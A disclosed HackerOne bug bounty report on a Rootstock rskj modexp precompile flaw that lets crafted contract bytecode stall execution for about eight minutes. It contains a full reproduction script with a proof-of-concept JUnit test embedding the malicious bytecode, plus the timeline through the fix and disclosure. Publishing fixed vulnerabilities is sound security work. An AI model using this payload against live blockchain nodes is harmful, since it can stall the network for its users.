---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/uncontrolled-resource-consumption
  - env/web
substate: "resolved"
weakness: "Uncontrolled Resource Consumption"
enriched: true
body: true
date: 2025-06-13
submitted: 2024-03-11T19:40:38.520Z
bounty_usd: null
votes: 85
cve: []
program: "[[programs/rootstocklabs|Rootstock Labs]]"
reporter: "guido"
source: "https://hackerone.com/reports/2412583"
title: "Crafted smart contract can take 8 minutes to execute due to bug in modexp precompile."
---
# Crafted smart contract can take 8 minutes to execute due to bug in modexp precompile.

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 85 | **Program:** Rootstock Labs | **Disclosed:** 2025-06-13

- Report: [https://hackerone.com/reports/2412583](https://hackerone.com/reports/2412583)
- CWE: Uncontrolled Resource Consumption
- Submitted: 2024-03-11T19:40:38.520Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
A bug in the modexp precompile can cause long stalls.

## Steps To Reproduce:
Tested on Linux x64.

```sh
#!/bin/bash

wget -q https://download.java.net/java/GA/jdk11/9/GPL/openjdk-11.0.2_linux-x64_bin.tar.gz
tar zxf openjdk-11.0.2_linux-x64_bin.tar.gz
export JAVA_HOME=$(realpath jdk-11.0.2/)
git clone --depth 1 https://github.com/rsksmart/rskj.git
cd rskj/
./configure.sh
echo """
package co.rsk.vm;

import org.ethereum.config.blockchain.upgrades.ActivationConfig;
import co.rsk.config.TestSystemProperties;
import co.rsk.config.VmConfig;
import org.ethereum.vm.*;
import org.ethereum.core.BlockFactory;
import org.ethereum.core.BlockTxSignatureCache;
import org.ethereum.core.ReceivedTxSignatureCache;
import org.ethereum.vm.program.invoke.ProgramInvokeMockImpl;
import java.util.HashSet;
import org.ethereum.vm.program.Program;
import org.ethereum.config.blockchain.upgrades.ActivationConfigsForTest;
import javax.xml.bind.DatatypeConverter;
import org.junit.jupiter.api.Test;

public class Poc {
    @Test
    void testPoc() {
        TestSystemProperties config = new TestSystemProperties();
        PrecompiledContracts precompiledContracts = new PrecompiledContracts(config, null, new BlockTxSignatureCache(new ReceivedTxSignatureCache()));
        BlockFactory blockFactory = new BlockFactory(config.getActivationConfig());
        VmConfig vmConfig = config.getVmConfig();
        ProgramInvokeMockImpl invoke = new ProgramInvokeMockImpl();
        ActivationConfig.ForBlock activations = ActivationConfigsForTest.fingerroot500().forBlock(0);

        byte[] code = DatatypeConverter.parseHexBinary(\"3332335b59313660d53d601c30303030333333333d601c30303030333333333333321b1b1b1b325b593136605858425a606052015952601d52609880808060006000600536f1603d3333321b1b1b1b32365b3159605858425a606052015952601d52609880808060006000600536f1603d313880813b60003960006000f50a30303030303030\");

        invoke.setGas(1000 * 1000 * 5);
        VM vm = new VM(vmConfig, precompiledContracts);
        Program program = new Program(vmConfig, precompiledContracts, blockFactory, activations, code, invoke,null, new HashSet<>(), new BlockTxSignatureCache(new ReceivedTxSignatureCache()));

        for (int k = 0; k < 250; k++) {
            vm.step(program);
        }
    }
}
""">rskj-core/src/test/java/co/rsk/vm/Poc.java

# This will likely fail due to a java.lang.OutOfMemoryError exception
time ./gradlew test  --tests co.rsk.vm.Poc.testPoc

# Increase test heap size
sed -i 's/Xmx3G/Xmx10G/g' rskj-core/build.gradle

# Run again
time ./gradlew test  --tests co.rsk.vm.Poc.testPoc
```

Output:

```
real    8m23.429s
user    0m3.147s
sys	0m0.265s
```

## Impact

Stall the network.

## Timeline

- **Report Filed**
- **2024-03-12** @vrongusername: Hello @guido !

Thank you for the report!
Can you please provide us a solidity code of the contract?
- **2024-03-12** @bernacodesido: Hey @guido 

Thanks for your report. We are currently analyzing it.
- **2024-03-12** @guido: Thanks, do you still need a Solidity version of this? It might take me some time to construct.
- **2024-03-12** @vrongusername: @Guido, no need if you haven't used it.
- **2024-03-24** @guido: Do you have an update you can share on this please?
- **2024-03-26** @h1_analyst_dmitry: Hi @guido,

I have pinged the IOVLabs team regarding this report. I will get back to you as soon as I hear back from them. Please bear with us in the meantime.

Thank you for your patience.

Cheers,
@h1_analyst_dmitry
- **2024-03-26** @vrongusername: Hello @guido,
Thanks for your patience! We confirmed the issue and currently fixing it.
We'll back to you soon.
- **2024-04-08** @guido: @vrongusername update please?
- **2024-04-11** @guido: I believe you have fixed the bug, please proceed to the reward now.
- **Report Severity Updated**
- **Bounty Awarded**
- **Report Resolved**
- **2024-07-17** @guido: @bernacodesido Can I talk about this bug publicly (just this bug, not the other oones I reported)? Did everyone upgrade their nodes to an unaffected version?
- **Agreed On Going Public**
- **2025-06-13** @vrongusername: Hi @guido,
Would you be ok if we disclose this issue as well?
- **Agreed On Going Public**
- **Report Became Public**
